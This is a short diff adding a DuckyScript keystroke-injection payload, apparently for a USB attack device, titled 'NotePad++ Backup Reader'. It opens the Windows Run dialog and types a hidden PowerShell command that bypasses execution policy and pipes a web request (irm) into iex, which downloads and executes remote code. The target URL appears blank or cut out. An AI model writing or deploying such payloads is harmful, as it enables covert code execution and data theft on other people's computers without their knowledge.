@@ -1,0 +1,5 @@
+REM Title: NotePad++ Backup Reader
+REM Author: Contrxl
+GUI r 
+DELAY 500
+STRING powershell -w h -NoP -NonI -Ep Bypass $db='';irm | iex
